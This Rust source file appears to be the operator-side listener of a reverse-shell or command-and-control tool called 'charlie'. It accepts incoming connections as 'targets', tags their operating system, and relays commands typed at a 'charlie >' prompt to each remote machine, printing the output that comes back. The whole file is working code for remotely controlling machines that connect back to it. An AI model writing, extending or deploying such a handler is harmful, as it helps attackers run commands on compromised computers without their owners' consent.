use std::net::{TcpListener, TcpStream};
use std::io::{self, stdin, Read, Write};
use std::str;

use crate::library::Target;
use crate::library::parse_command_and_write;

pub fn socket_listen(addr: &String, port: &String) {

    // let mut target_vec: Vec<&Target> = vec![];

    // bind to socket
    let listner = TcpListener::bind(format!("{addr}:{port}")).unwrap();

    println!("Waiting for connection...");
    
    for stream in listner.incoming() {

        let stream = stream.unwrap();

        let target = Target {
            stream: stream,
            os: String::from("mac"),
        };

        // target_vec.push(&target);

        println!("NEW TARGET - OS: [{}], ADDR: [{}]", target.os, target.stream.peer_addr().unwrap());

        handle_client(target.stream);
        
    }
}

fn handle_client(mut stream: TcpStream) {
    loop {
        // write
        print!("charlie > ");
        io::stdout().flush().unwrap();
        let mut write_buf = String::new();
        stdin().read_line(&mut write_buf).unwrap();
        parse_command_and_write(write_buf, &mut stream);
        
        // stream.write(write_buf.as_bytes()).unwrap();

        // read
        let mut read_buf = [0u8; 1024];
        let mut bytes_read = stream.read(&mut read_buf).unwrap();
        while bytes_read >= read_buf.len() {
            let data = &read_buf[..bytes_read];
            print!("{}", str::from_utf8(&data).unwrap());
            bytes_read = stream.read(&mut read_buf).unwrap();
        }
        let data = &read_buf[..bytes_read];
        print!("{}", str::from_utf8(&data).unwrap());
    }
}
